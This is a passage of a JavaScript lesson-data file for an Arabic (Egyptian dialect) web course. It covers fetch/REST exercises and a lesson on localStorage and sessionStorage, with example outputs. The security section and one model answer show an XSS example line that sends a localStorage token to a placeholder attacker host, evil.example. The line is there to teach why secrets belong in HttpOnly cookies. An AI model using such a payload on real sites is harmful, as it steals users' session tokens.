- **[[POST]]:** التاني غيّر الحالة أو لأ حسب السيرفر. هنا اترفض، وفي API من غير قاعدة اسم فريد كان هيبقى ٤.
- **[[DELETE]]:** الرد اتغيّر بس الحالة لأ. idempotent بتتكلم عن الحالة مش الرد.
- **[[body && JSON.stringify(body)]]:** لو مفيش body بيبقى [[undefined]] و [[fetch]] مبيبعتش حاجة.` },
            { lvl: 'تطبيق', t: R`**ابني في المتصفح:** صفحة بتجيب [[hello.txt]] بـ [[text()]] وتعرضه في [[<pre>]]، وتجيب صورة بـ [[blob()]] وتعرضها من [[URL.createObjectURL]] وتكتب تحتها نوعها وحجمها، وتعمل [[revokeObjectURL]] بعد ما تتحمّل. وجرّب [[json()]] وبعدها [[text()]] على نفس الرد (من قسم ٥ في الشرح).`, done: R`النص والصورة ظاهرين، والسطر بيقول [[image/svg+xml]] و ١١٤ بايت، والقراية التانية رمت [[body stream already read]].`, sol: R`~~~html media.html
<!doctype html>
<html lang="ar" dir="rtl">
<head><meta charset="utf-8"><title>نص وصورة</title></head>
<body>
<pre id="text"></pre>
<figure id="pic"><figcaption></figcaption></figure>
<script type="module">
document.querySelector("#text").textContent = await (await fetch("hello.txt")).text();
const res = await fetch("dot.svg");
const blob = await res.blob();
const url = URL.createObjectURL(blob);
const img = document.createElement("img");
img.src = url;
img.alt = "نقطة خضرا";
await img.decode();
URL.revokeObjectURL(url);
document.querySelector("#pic").prepend(img);
document.querySelector("figcaption").textContent = blob.type + "، " + blob.size + " بايت، " + img.naturalWidth + "×" + img.naturalHeight;
const twice = await fetch("shop.json");
await twice.json();
try { await twice.text(); } catch (e) { console.log(e.name + ": " + e.message); }
</script>
</body>
</html>
~~~

~~~text الناتج (Chrome 157 من سيرفر محلي)
الصفحة: «أهلًا من ملف نص» و «سطر تاني» في pre، وتحتهم الدايرة الخضرا، و «image/svg+xml، 114 بايت، 40×40»
الـ Console: TypeError: Failed to execute 'text' on 'Response': body stream already read
~~~

- **[[revokeObjectURL]] بعد [[decode()]]:** الصورة اتفكت واترسمت، فالعنوان مبقاش محتاجينه. لو عملتها قبل [[decode]] ممكن الصورة متظهرش.
- **[[blob.size]]** = نفس [[Content-Length]] اللي جه من السيرفر.
- **الصفحة دي لازم من سيرفر** ([[npx serve]] أو [[python -m http.server]] أو سيرفر Node): من [[file://]] الـ [[fetch]] بيترفض (درس «سيرفر محلي بدل file://»).` },
            { lvl: 'تطبيق', t: R`**صلّح الكود البايظ:** [[await fetch(API, { method: "POST", body: { name: "لاتيه", price: 60 } })]] بيرجع 400. اعرف السيرفر استلم إيه بالظبط (من غير ما تفتح السيرفر: اعمل [[new Request(...)]] بنفس الـ options واقرا [[await req.text()]] و [[req.headers.get("Content-Type")]]). وصلّحه (من قسم ٢ في الشرح).`, done: R`عرفت إن اللي اتبعت النص [["[object Object]"]] بنوع [[text/plain]]، والمصلّح رجّع 201.`, sol: R`~~~js post-bug.js
const API = "http://localhost:3000/api/items";
const bad = await fetch(API, { method: "POST", body: { name: "لاتيه", price: 60 } });
console.log("بايظ:", bad.status, await bad.json());
const req = new Request(API, { method: "POST", body: { name: "x" } });
console.log("اللي اتبعت فعلًا:", await req.text(), "|", req.headers.get("Content-Type"));
const good = await fetch(API, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ name: "لاتيه", price: 60 }) });
console.log("صح:", good.status, await good.json());
~~~

~~~text الناتج (node post-bug.js، Node 24.22، والسيرفر شغال)
بايظ: 400 { error: 'الـ body لازم JSON object' }
اللي اتبعت فعلًا: [object Object] | text/plain;charset=UTF-8
صح: 201 { id: 4, name: 'لاتيه', price: 60 }
~~~

- **[[fetch]] بيحوّل أي body مش معروف لنص بـ [[String(body)]]**، و [[String({})]] = [["[object Object]"]]. مفيش error في الـ client خالص، المشكلة بتبان في السيرفر بس.
- **[[new Request(url, options)]]** بيعمل نفس الطلب من غير ما يبعته، فتقدر تشوف الـ body والـ headers اللي [[fetch]] كان هيبعتهم.
- **الـ id ٤** لأن الطلب الأول البايظ مخدش id، والـ ٣ راح في تشغيل قبله (الـ [[nextId]] مبيرجعش لورا).` },
            { lvl: 'تحدي', t: R`**ابني في السيرفر:** زوّد على [[GET /api/items]] فلترين من الـ query string: [[?maxPrice=30]] (السعر أقل من أو يساوي) و [[?q=شاي]] (الاسم فيه الكلمة)، ومع بعض. [[maxPrice]] مش رقم أو فاضي = 400. وابني الـ URL من الـ client بـ [[URLSearchParams]] عشان العربي يتعمله encode (من قسمي ١ و ٢ في الشرح).`, done: R`[[?maxPrice=30]] رجّعت الشاي والشاي بلبن، و [[?maxPrice=25&q=شاي]] رجّعت الشاي بس، و [[abc]] والفاضي رجّعوا 400.`, sol: R`التعديل في [[server.js]]: سطر الـ [[GET]] بتاع اللستة بقى كده:

~~~js server.js (الجزء اللي اتغيّر)
    if (req.method === "GET") {
      let list = [...items.values()];
      const max = url.searchParams.get("maxPrice");
      if (max !== null) {
        const n = Number(max);
        if (max.trim() === "" || !Number.isFinite(n)) return send(res, 400, { error: "maxPrice لازم رقم" });
        list = list.filter(i => i.price <= n);
      }
      const q = url.searchParams.get("q");
      if (q) list = list.filter(i => i.name.includes(q));
      return send(res, 200, list);
    }
~~~

~~~bash
curl -s -X POST localhost:3000/api/items -d '{"name":"شاي بلبن","price":30}'
curl -s "localhost:3000/api/items?maxPrice=30"
curl -s "localhost:3000/api/items?q=%D8%B4%D8%A7%D9%8A"
curl -s "localhost:3000/api/items?maxPrice=25&q=%D8%B4%D8%A7%D9%8A"
curl -s "localhost:3000/api/items?maxPrice=abc"
curl -s "localhost:3000/api/items?maxPrice="
node -e 'console.log(new URLSearchParams({ maxPrice: 30, q: "شاي" }).toString())'
~~~

~~~text الناتج (Git Bash، Node 24.22)
[{"id":2,"name":"شاي","price":20},{"id":3,"name":"شاي بلبن","price":30}]
[{"id":2,"name":"شاي","price":20},{"id":3,"name":"شاي بلبن","price":30}]
[{"id":2,"name":"شاي","price":20}]
{"error":"maxPrice لازم رقم"}
{"error":"maxPrice لازم رقم"}
maxPrice=30&q=%D8%B4%D8%A7%D9%8A
~~~

- **[[max.trim() === ""]]:** [[Number("")]] = [[0]] مش [[NaN]]، فمن غير الشرط ده [[?maxPrice=]] كانت هترجّع الأصناف المجانية بس من غير error.
- **[[url.searchParams.get]]** بيفك الـ encoding لوحده، فـ [[%D8%B4...]] بقت «شاي».
- **الفلتر query string مش عنوان جديد:** لسه نفس الـ resource ([[/api/items]])، بس متفلتر. وده الشكل المتعارف عليه في REST.
- **من الـ client:** [[fetch(API + "?" + new URLSearchParams({ maxPrice: 30, q: "شاي" }))]].` },
          ],
          ref: [
            { t: "MDN: REST", url: "https://developer.mozilla.org/en-US/docs/Glossary/REST" },
            { t: "MDN: CRUD", url: "https://developer.mozilla.org/en-US/docs/Glossary/CRUD" },
            { t: "MDN: HTTP request methods", url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Methods" },
            { t: "MDN: Idempotent", url: "https://developer.mozilla.org/en-US/docs/Glossary/Idempotent" },
            { t: "MDN: HTTP response status codes", url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status" },
            { t: "MDN: Using the Fetch API", url: "https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch" },
            { t: "MDN: Response", url: "https://developer.mozilla.org/en-US/docs/Web/API/Response" },
            { t: "MDN: Response.blob()", url: "https://developer.mozilla.org/en-US/docs/Web/API/Response/blob" },
            { t: "MDN: URL.createObjectURL()", url: "https://developer.mozilla.org/en-US/docs/Web/API/URL/createObjectURL_static" },
            { t: "Node.js: HTTP", url: "https://nodejs.org/api/http.html" },
          ],
          pre: ["js/fetch و AbortController", { to: "start/HTTP: الطلب والرد", why: R`الطلب والرد والـ headers من الأساس` }, { to: "web/Status codes", why: R`كل كود معناه إيه وتشوفه فين في DevTools` }, { to: "node/node:http سيرفر من غير مكتبة", why: R`[[createServer]] و [[req]] و [[res]] اللي السيرفر هنا مبني عليهم` }],
          deep: {
            why: R`أي واجهة بتتكلم مع سيرفر بتعمل الأربع عمليات دول. لو فهمت الـ methods والـ status codes، هتقرا أي API documentation وتعرف تكتب الـ client بتاعه في دقايق، وهتعرف تفرّق بين «الطلب فشل» و «السيرفر قال لأ».`,
            how: R`[[fetch]] بيبني طلب HTTP: سطر الـ method والعنوان، والـ headers، والـ body (نص أو بايتس). السيرفر بيقرا السطر ده ويختار الكود حسب الـ method والـ path، ويرجّع status و headers و body. [[res.json()]] بتقرا الـ body كله كـ stream وتعمل [[JSON.parse]]. و [[blob()]] بتحتفظ بالبايتس زي ما هي ومعاها [[Content-Type]].`,
            when: R`REST لأي CRUD بسيط وواضح (لستات ونماذج). [[PATCH]] لما الفورم بيغيّر حقل أو اتنين، و [[PUT]] لما بتبعت العنصر كله (صفحة تعديل كاملة). [[blob()]] للصور والملفات اللي محتاجة auth أو preview. ولما الطلبات تبقى معقدة جدًا (شاشة محتاجة ١٠ resources) الناس بتروح لـ GraphQL أو endpoints مجمّعة.`,
            mistakes: R`نسيان [[JSON.stringify]] أو [[Content-Type]]. [[res.json()]] من غير [[res.ok]]. [[json()]] على 204. قراية الـ body مرتين. أفعال في العنوان ([[/getItems]] و [[/deleteItem]]). 200 على كل حاجة والخطأ جوه الـ body. إعادة [[POST]] لوحدها بعد timeout. نسيان [[revokeObjectURL]].`,
          },
        },
        {
          cmd: "Web Storage: localStorage و sessionStorage",
          title: "مفتاح وقيمة نص جوه المتصفح: يفضل بعد الـ reload، ويتشارك بين التابات، وأي سكربت يقراه",
          desc: R`[[localStorage]] و [[sessionStorage]] (اسمهم مع بعض Web Storage) بيخزّنوا أزواج مفتاح وقيمة **نصوص بس** لكل origin. [[localStorage]] بيفضل لحد ما يتمسح، ومشترك بين كل التابات من نفس الموقع. [[sessionStorage]] لكل تاب لوحده، وبيعيش مع الـ reload وبيموت مع قفل التاب. الاتنين sync (بيوقفوا الصفحة لحد ما يخلصوا) وحدهم حوالي ٥ مليون حرف.
• [[setItem(key, value)]] و [[getItem(key)]] ([[null]] لو مش موجود) و [[removeItem(key)]] و [[clear()]] و [[key(i)]] و [[length]].
• أي قيمة بتتحوّل نص: [[false]] تبقى [["false"]] و object يبقى [["[object Object]"]]، فالـ objects بـ [[JSON.stringify]] و [[JSON.parse]].
• الحدث [[storage]] بيوصل للتابات **التانية** لما تاب يغيّر حاجة.
• [[QuotaExceededError]] لما المساحة تخلص، و [[SecurityError]] لما التخزين ممنوع (sandbox أو إعدادات).
• أي JavaScript في الصفحة يقدر يقراه: متحطش فيه توكنز ولا أسرار.`,
          example: R`localStorage.setItem("theme", "dark");
localStorage.setItem("visits", 3);
localStorage.setItem("cart", JSON.stringify([{ id: 1, qty: 2 }]));
console.log(typeof localStorage.getItem("visits"), localStorage.getItem("nothing"));
console.log(JSON.parse(localStorage.getItem("cart"))[0].qty);
console.log(localStorage.length, localStorage.key(0));
localStorage.removeItem("theme");
sessionStorage.setItem("step", "2");
addEventListener("storage", e => console.log(e.key, e.oldValue, e.newValue));`,
          try: R`في صفحة من سيرفر محلي: اعمل [[localStorage.setItem("user", { name: "سارة" })]] و [[localStorage.setItem("flag", false)]] واقراهم. وبعدين افتح نفس الصفحة في تاب تاني: [[localStorage]] فيه إيه؟ و [[sessionStorage]]؟ وجرّب [[localStorage.getItem("user").name]].`,
          sol: R`~~~text الناتج (Chrome 157)
localStorage.getItem("user")           '[object Object]'
localStorage.getItem("flag")           'false'
localStorage.getItem("flag") ? 1 : 0   1
التاب التاني: localStorage.getItem("flag")   'false'
التاب التاني: sessionStorage.getItem("step") null
localStorage.getItem("user").name      undefined
~~~

- الـ object اتحوّل بـ [[String()]] لـ [["[object Object]"]] واتخزّن كده. البيانات راحت، ومفيش error.
- [["false"]] نص مش فاضي، فهو truthy: [[if]] عليه بيدخل (تمرين ٤).
- التاب التاني شاف [[localStorage]] نفسه، بس [[sessionStorage]] بتاعه فاضي: كل تاب ليه واحد.
- [[.name]] على نص = [[undefined]]. لازم [[JSON.parse]] الأول، واللي اتخزّن غلط مش هيرجع.`,
          teach: R`## الفكرة

كل origin (البروتوكول والدومين والبورت: [[http://localhost:8765]]) ليه درجين صغيرين في المتصفح، كل درج فيه أزواج «مفتاح: نص»:

| | [[localStorage]] | [[sessionStorage]] |
|---|---|---|
| بيعيش لحد | ما اليوزر أو الكود يمسحه | التاب يتقفل (بيعيش مع الـ reload) |
| مشترك بين التابات | آه، كل التابات من نفس الـ origin | لأ، كل تاب لوحده |
| [[window.open]] من التاب | نفس الدرج | التاب الجديد بياخد **نسخة** (اتقاس: [["2"]]) |
| بيتبعت للسيرفر | لأ | لأ |
| الحد | حوالي ٥ مليون حرف (Chrome) | نفس الكلام |
| sync | آه، بيوقف الصفحة | آه |

[[http://localhost:8765]] و [[http://127.0.0.1:8765]] origins مختلفين: حطينا [["who"]] في الأول، والتاني شافه [[null]]. كل النواتج من Chrome 157 على صفحة من سيرفر محلي.

---

## ١. الـ API كله

~~~text الناتج: المثال
string null
2
3 theme
~~~

| الدالة | بتعمل | لو مش موجود |
|---|---|---|
| [[setItem(key, value)]] | بتخزّن (أو بتكتب فوق) | |
| [[getItem(key)]] | بترجّع النص | [[null]] |
| [[removeItem(key)]] | بتمسح مفتاح | مفيش error |
| [[clear()]] | بتمسح كل مفاتيح الـ origin | |
| [[key(i)]] | اسم المفتاح رقم [[i]] | [[null]] |
| [[length]] | عدد المفاتيح | |

**الترتيب مش ترتيب الإضافة:** ضفنا [[theme]] ثم [[visits]] ثم [[user]] ثم [[cart]]، و [[key(i)]] رجّعت [[theme,cart,user,visits]]. متعتمدش على [[key(i)]] لترتيب. [[Object.keys(localStorage)]] بترجّع نفس اللستة.

**متكتبش [[localStorage.foo = "bar"]]:** بتشتغل (خصايص الـ Storage بتتحوّل مفاتيح)، بس مفتاح اسمه [[getItem]] أو [[length]] هيتلخبط مع الدوال. [[setItem]] و [[getItem]] دايمًا.

---

## ٢. نصوص بس

~~~text الناتج
setItem("visits", 3)           → getItem: '3' (string)
setItem("user", { name: "سارة" }) → '[object Object]'
setItem("flag", false)         → 'false' (truthy!)
setItem("n", null)             → 'null'
setItem("u", undefined)        → 'undefined'
~~~

أي قيمة بتعدّي على [[String(value)]]. فالقاعدة: **[[JSON.stringify]] وانت بتكتب، و [[JSON.parse]] وانت بتقرا**:

~~~js saved.js
const saved = {
  load(key, fallback) {
    try {
      const text = localStorage.getItem(key);
      return text === null ? fallback : JSON.parse(text);
    } catch {
      return fallback;
    }
  },
  save(key, value) {
    try {
      localStorage.setItem(key, JSON.stringify(value));
      return true;
    } catch (err) {
      console.log("مقدرتش أحفظ:", err.name);
      return false;
    }
  },
};
~~~

الـ [[try]] في الاتنين مش زيادة. الـ [[getItem]] نفسها ممكن ترمي (القسم الجاي)، و [[JSON.parse]] بترمي لو القيمة بايظة (كتبتها نسخة قديمة من كودك أو اليوزر عدّلها من DevTools). والـ [[setItem]] بترمي لو المساحة خلصت. وتفاصيل التعامل مع داتا محفوظة قديمة أو بايظة في درس «خلّي التطبيق يفتكر».

**التواريخ:** [[JSON.stringify(new Date())]] بيرجّع نص ISO، و [[JSON.parse]] بيرجّعه نص مش [[Date]]: [[new Date(saved.load("lastVisit"))]].

---

## ٣. لما التخزين يرمي

**المساحة خلصت:** ملينا [[localStorage]] بقطع كل واحدة مليون حرف:

~~~text الناتج (Chrome 157)
after 4 MB: QuotaExceededError: Failed to execute 'setItem' on 'Storage': Setting the value of 'big4' exceeded the quota. | code 22 | true
arabic after 4
~~~

- القطعة الخامسة اترفضت: الحد حوالي ٥ مليون **حرف** للـ origin كله (المفاتيح والقيم مع بعض).
- مليون حرف «ع» اترفضت عند نفس العدد بالظبط: Chrome بيعدّ حروف (UTF-16) مش بايتس UTF-8، فالعربي مش بياخد ضعف المساحة هنا.
- [[e.name === "QuotaExceededError"]] هو الفحص الصح ([[code 22]] قديم).

**التخزين ممنوع خالص:** صفحة جوه iframe عليه [[sandbox]] من غير [[allow-same-origin]] (زي الـ preview الحي في الموقع ده بالظبط)، أو يوزر قافل الـ site data:

~~~text الناتج (Chrome 157، جوه الـ preview الحي بتاع الموقع)
SecurityError: Failed to read the 'localStorage' property from 'Window': The document is sandboxed and lacks the 'allow-same-origin' flag.
~~~

لاحظ إن **مجرد قراية [[localStorage]]** بترمي، مش [[setItem]] بس. عشان كده تمرين ٢ والمشاريع بيلفّوا كل وصول في [[try]] ويكمّلوا من الذاكرة.

**الوضع الخفي (Incognito):** في Chrome الـ [[localStorage]] شغال عادي، بس بيتمسح كله لما تقفل كل شبابيك الوضع الخفي. فمتعتمدش إن «المحفوظ» هيفضل.

---

## ٤. الحدث [[storage]]: تاب بيكلّم تاب

تابين على نفس الصفحة، التاني بيسمع، والأول بيكتب:

~~~js التاب الأول
localStorage.setItem("theme", "dark");
localStorage.setItem("theme", "light");
localStorage.setItem("theme", "light");
localStorage.removeItem("theme");
localStorage.setItem("a", "1");
localStorage.clear();
~~~

~~~text الناتج في التاب التاني: key | oldValue | newValue | url | storageArea === localStorage
theme | null | dark | http://localhost:8765/ | true
theme | dark | light | http://localhost:8765/ | true
theme | light | null | http://localhost:8765/ | true
a | null | 1 | http://localhost:8765/ | true
null | null | null | http://localhost:8765/ | true
~~~

- **التاب اللي كتب مبيوصلوش الحدث** (عدّينا: صفر). الحدث للتابات التانية بس.
- **نفس القيمة مرتين** ([["light"]] ثم [["light"]]) مطلّعتش حدث.
- **[[clear()]]** بيطلّع حدث واحد [[key]] فيه [[null]].
- **[[sessionStorage]]** مبيطلّعش أحداث لتابات تانية (كل تاب ليه واحد).

الاستخدام: تسجيل خروج في تاب يخرّج الباقي، الثيم يتغيّر في كل التابات، العربة تتحدث (تمرين ٣). ولو عايز رسايل بين التابات من غير تخزين: [[BroadcastChannel]] (درس «IndexedDB و BroadcastChannel»).

---

## ٥. اللي ميتحطش فيه

أي سكربت بيشتغل في الصفحة بيقرا [[localStorage]] كله في سطر. لو فيه ثغرة XSS واحدة (تعليق يوزر اتحط بـ [[innerHTML]] مثلًا: درس «innerHTML هي الباب»):

~~~html
<img src=x onerror="fetch('https://evil.example/?t=' + localStorage.getItem('token'))">
~~~

التوكن راح. ومفيش حاجة في [[localStorage]] تقدر تقفلها عن JavaScript. عشان كده:

| ينفع | ميتحطش |
|---|---|
| الثيم، اللغة، حجم الخط، آخر تاب | توكن الـ login، أو أي session id |
| مسودة فورم، فلاتر البحث | باسوردات، بيانات كارت، رقم قومي |
| كاش لداتا عامة | داتا حساسة لأي يوزر (الجهاز ممكن يبقى مشترك) |

التوكن مكانه كوكي [[HttpOnly]] (الدرس الجاي) اللي JavaScript مبيشوفهاش أصلًا. (وفك الـ JWT اللي في [[localStorage]] في درس «localStorage و JWT» بتاب الـ web.)

---

## الخلاصة

| عايز | اكتب |
|---|---|
| تحفظ object | [[localStorage.setItem(k, JSON.stringify(v))]] |
| تقراه بأمان | [[try { JSON.parse(localStorage.getItem(k)) ?? fallback } catch { fallback }]] |
| لحد ما التاب يتقفل | [[sessionStorage]] |
| تعرف إن تاب تاني غيّر | [[addEventListener("storage", e => ...)]] |
| تمسح | [[removeItem(k)]] أو [[clear()]] |

اللي ميتلخبطش: نصوص بس، و [[null]] للمفتاح المش موجود، و [[getItem]] نفسها ممكن ترمي، والحدث للتابات التانية بس، ومفيش أسرار.`,
          lines: [
            R`بنخزّن النص [["dark"]] تحت المفتاح [[theme]] للـ origin ده`,
            R`الرقم ٣ بيتخزّن نص [["3"]]`,
            R`array بيتحوّل JSON قبل ما يتخزّن`,
            R`[["string"]]: أي قيمة بترجع نص، و [[null]] للمفتاح اللي مش موجود`,
            R`[[JSON.parse]] بيرجّع الـ array، فـ [[qty]] = ٢ رقم`,
            R`٣ مفاتيح، و [[key(0)]] اسم أول مفتاح في ترتيب المتصفح (مش ترتيب الإضافة)`,
            R`بيمسح مفتاح [[theme]] بس والباقي زي ما هو، ولو مش موجود مبيرميش`,
            R`[[sessionStorage]]: نفس الـ API، بس للتاب ده لحد ما يتقفل`,
            R`بيسمع على التغييرات اللي تابات **تانية** بتعملها في [[localStorage]]`,
          ],
          practice: [
            { lvl: 'سريع', t: R`**اقرا وتوقّع:** بعد [[setItem("visits", 3)]] و [[setItem("user", { name: "سارة" })]] و [[setItem("n", null)]] و [[setItem("u", undefined)]]: إيه اللي [[getItem]] هترجّعه لكل واحد؟ وإيه [[getItem("nothing")]]؟ اكتبهم بالتنصيص الصح (نص ولا [[null]]) (من قسم ٢ في الشرح).`, done: R`كتبت [["3"]] و [["[object Object]"]] و [["null"]] (نص) و [["undefined"]] و [[null]] (قيمة) قبل التشغيل.`, sol: R`~~~js الـ Console (صفحة من سيرفر محلي)
localStorage.setItem("visits", 3);
localStorage.setItem("user", { name: "سارة" });
localStorage.setItem("n", null);
localStorage.setItem("u", undefined);
console.log(JSON.stringify([localStorage.getItem("visits"), localStorage.getItem("user"), localStorage.getItem("n"), localStorage.getItem("u"), localStorage.getItem("nothing")]));
~~~

~~~text الناتج (Chrome 157)
["3","[object Object]","null","undefined",null]
~~~

- آخر واحدة بس [[null]] بجد (من غير تنصيص في الـ JSON): المفتاح مش موجود.
- [["null"]] و [["undefined"]] نصوص من ٤ و ٩ حروف، فـ [[getItem("n") === null]] = [[false]]. ده باج شائع: حد بيعمل [[setItem("user", null)]] عشان «يمسح»، والمفروض [[removeItem("user")]].` },
            { lvl: 'تطبيق', t: R`**ابني:** [[saved.load(key, fallback)]] و [[saved.save(key, value)]]: JSON في الاتجاهين، وقيمة افتراضية لو المفتاح مش موجود أو القيمة بايظة، و [[save]] بترجّع [[false]] بدل ما ترمي لو المساحة خلصت. جرّبها على عربة، وعلى قيمة بايظة [["{بايظ"]]، وعلى نص ٦ مليون حرف (من قسمي ٢ و ٣ في الشرح).`, done: R`العربة رجعت array والـ [[qty + 1]] = ٣، والبايظة رجّعت الـ fallback، والكبيرة رجّعت [[false]] ومطبوع [[QuotaExceededError]]، والصفحة مكمّلة.`, sol: R`~~~js saved.js (في صفحة من سيرفر محلي)
const saved = {
  load(key, fallback) {
    try {
      const text = localStorage.getItem(key);
      return text === null ? fallback : JSON.parse(text);
    } catch {
      return fallback;
    }
  },
  save(key, value) {
    try {
      localStorage.setItem(key, JSON.stringify(value));
      return true;
    } catch (err) {
      console.log("مقدرتش أحفظ:", err.name);
      return false;
    }
  },
};
localStorage.removeItem("cart");
console.log(JSON.stringify(saved.load("cart", [])));
saved.save("cart", [{ id: 1, qty: 2 }]);
console.log(JSON.stringify(saved.load("cart", [])), saved.load("cart", [])[0].qty + 1);
localStorage.setItem("cart", "{بايظ");
console.log(JSON.stringify(saved.load("cart", [])));
console.log(saved.save("big", "x".repeat(6 * 1024 * 1024)));
~~~

~~~text الناتج (Chrome 157)
[]
[{"id":1,"qty":2}] 3
[]
مقدرتش أحفظ: QuotaExceededError
false
~~~

- **[[text === null ? fallback]]** قبل [[JSON.parse]]: لأن [[JSON.parse(null)]] بترجّع [[null]] (مش بترمي)، فمن غير الشرط كنت هتاخد [[null]] بدل [[[]]] وتقع في [[.push]] بعدين.
- **[[catch]] من غير [[(err)]]** (optional catch binding) لما مش محتاج الخطأ.
- **في الـ preview الحي** (sandbox): [[load]] بترجّع الـ fallback دايمًا و [[save]] بترجّع [[false]]، والصفحة شغالة. ده بالظبط سبب الـ [[try]].
- **ناقص:** التحقق من الشكل. [[saved.load("cart", [])]] ممكن ترجّع object لو حد خزّن object. درس «خلّي التطبيق يفتكر» بيكمّل بالتحقق ورقم نسخة.` },
            { lvl: 'تطبيق', t: R`**ابني:** عدّاد ضغطات متخزّن في [[localStorage]]، ولو فتحت الصفحة في تابين وضغطت في واحد، التاني يتحدث من غير reload (بالحدث [[storage]]). ولو [[clear()]] اتعمل في تاب، التاني يرجع صفر (من قسم ٤ في الشرح).`, done: R`٣ ضغطات في التاب الأول = ٣ في التاني، وضغطة في التاني = ٤ في الاتنين، و [[clear()]] في التاني رجّع الأول صفر.`, sol: R`~~~html counter.html
<p id="count">0</p>
<button id="plus" type="button">+1</button>
<script>
const countEl = document.querySelector("#count");
const show = () => { countEl.textContent = localStorage.getItem("clicks") ?? "0"; };
document.querySelector("#plus").addEventListener("click", () => {
  localStorage.setItem("clicks", Number(localStorage.getItem("clicks") ?? 0) + 1);
  show();
});
addEventListener("storage", e => {
  if (e.key === "clicks" || e.key === null) show();
});
show();
</script>
~~~

~~~text الناتج (Chrome 157، تابين في نفس الـ browser context من Playwright)
بعد ٣ ضغطات في الأول:  tab1=3 tab2=3
ضغطة في التاني:        tab1=4 tab2=4
clear() في التاني:     tab1=0
~~~

- **[[show()]] بعد الضغطة في نفس التاب:** الحدث مش بيوصل للتاب اللي كتب، فلازم تحدّث بإيدك.
- **[[e.key === null]]:** ده شكل حدث [[clear()]].
- **[[?? "0"]] و [[?? 0]]:** أول مرة المفتاح مش موجود، و [[Number(null)]] = [[0]] أصلًا بس الـ [[??]] بيوضّح النية.
- **فيه race:** لو التابين ضغطوا في نفس اللحظة بالظبط، الاتنين ممكن يقروا ٤ ويكتبوا ٥. Web Storage مفيهوش transactions. لعدّاد مهم استخدم IndexedDB أو السيرفر.` },
            { lvl: 'تطبيق', t: R`**صلّح الكود البايظ:** [[localStorage.setItem("darkMode", false); if (localStorage.getItem("darkMode")) document.body.classList.add("dark");]]. الصفحة بقت غامقة ليه؟ صلّحه بطريقتين (من قسم ٢ في الشرح).`, done: R`عرفت إن [["false"]] truthy، والطريقتين بيدّوا «فاتح».`, sol: R`~~~js dark-mode.js (في صفحة)
localStorage.setItem("darkMode", false);
console.log("بايظ:", localStorage.getItem("darkMode") ? "غامق" : "فاتح");
console.log("صح:", localStorage.getItem("darkMode") === "true" ? "غامق" : "فاتح", JSON.parse(localStorage.getItem("darkMode")));
~~~

~~~text الناتج (Chrome 157)
بايظ: غامق
صح: فاتح false
~~~

- **[["false"]] نص فيه ٥ حروف**، وأي نص مش فاضي truthy.
- **الطريقة ١:** قارن بالنص: [[=== "true"]].
- **الطريقة ٢:** [[JSON.parse]] بيرجّع [[false]] الـ boolean (و [[JSON.stringify(false)]] وانت بتكتب للوضوح).
- **الأحسن:** خزّن القيمة نفسها مش «هل»: [[setItem("theme", "dark")]]، فمفيش boolean أصلًا، وتقدر تزوّد [["system"]] بعدين.` },
            { lvl: 'سريع', t: R`**اشرحها:** مدير المشروع عايز «تذكرني» بإن التوكن يتحفظ في [[localStorage]]. اكتبله في ٣ سطور الخطر بمثال، والبديل (من قسم ٥ في الشرح).`, done: R`فيه سطر الهجوم نفسه، والبديل كوكي [[HttpOnly]] بـ [[Max-Age]].`, sol: R`**إجابة نموذجية:**

1. **الخطر:** أي JavaScript بيشتغل في الصفحة بيقرا [[localStorage]] كله. ثغرة XSS واحدة (اسم يوزر اتعرض بـ [[innerHTML]]، أو مكتبة من CDN اتخترقت) = [[fetch("https://evil.example/?t=" + localStorage.getItem("token"))]]، والمهاجم بقى داخل بحساب اليوزر من جهازه لحد ما التوكن يخلص.
2. **مفيش قفل:** [[localStorage]] مالوش خاصية زي [[HttpOnly]] تخبّيه عن JS، ومالوش تاريخ انتهاء: بيفضل لحد ما حد يمسحه، حتى على جهاز مشترك.
3. **البديل:** السيرفر يحط التوكن في كوكي [[HttpOnly; Secure; SameSite=Lax]]، و «تذكرني» = [[Max-Age]] أطول (٣٠ يوم مثلًا) بدل كوكي session. الـ JS مبيشوفهاش أصلًا، والمتصفح بيبعتها لوحده مع كل طلب. ([[localStorage]] يفضل للثيم والمسودة.)` },
          ],
          ref: [
            { t: "MDN: Web Storage API", url: "https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API" },
            { t: "MDN: Window.localStorage", url: "https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage" },
            { t: "MDN: Window.sessionStorage", url: "https://developer.mozilla.org/en-US/docs/Web/API/Window/sessionStorage" },
            { t: "MDN: Storage", url: "https://developer.mozilla.org/en-US/docs/Web/API/Storage" },
            { t: "MDN: Window: storage event", url: "https://developer.mozilla.org/en-US/docs/Web/API/Window/storage_event" },
            { t: "MDN: Storage quotas and eviction criteria", url: "https://developer.mozilla.org/en-US/docs/Web/API/Storage_API/Storage_quotas_and_eviction_criteria" },
          ],
          pre: [{ to: "js/خلّي التطبيق يفتكر", why: R`داتا محفوظة قديمة أو بايظة، والتحقق ورقم النسخة` }, { to: "web/localStorage و JWT", why: R`تشوف وتعدّل [[localStorage]] من Application في DevTools` }, "js/JSON", { to: "js/innerHTML هي الباب", why: R`الـ XSS اللي بيخلي [[localStorage]] مش مكان للأسرار` }],
          deep: {
            why: R`أسهل طريقة تخلي الصفحة «تفتكر» حاجة بعد الـ reload من غير سيرفر: الثيم، واللغة، والمسودة، وآخر بحث. وأسهل طريقة تعمل ثغرة لو حطيت فيه حاجة سرية.`,
            how: R`المتصفح بيخزّن [[localStorage]] لكل origin في ملف على الديسك (في Chrome قاعدة LevelDB جوه البروفايل) ويحمّله في الذاكرة أول ما الصفحة تلمسه، فكل [[getItem]] sync. [[sessionStorage]] في الذاكرة مربوط بالتاب. ولما تاب يكتب، المتصفح بيبعت [[StorageEvent]] لكل الـ documents التانية من نفس الـ origin.`,
            when: R`[[localStorage]] لتفضيلات صغيرة ومسودات بتعيش أيام. [[sessionStorage]] لحالة خطوات فورم أو فلتر بتاع التاب ده بس. ولأي حاجة كبيرة (صور، آلاف السجلات)، أو محتاجة worker، أو مش عايز تقفل الصفحة: IndexedDB (درس «تختار تخزين إيه»).`,
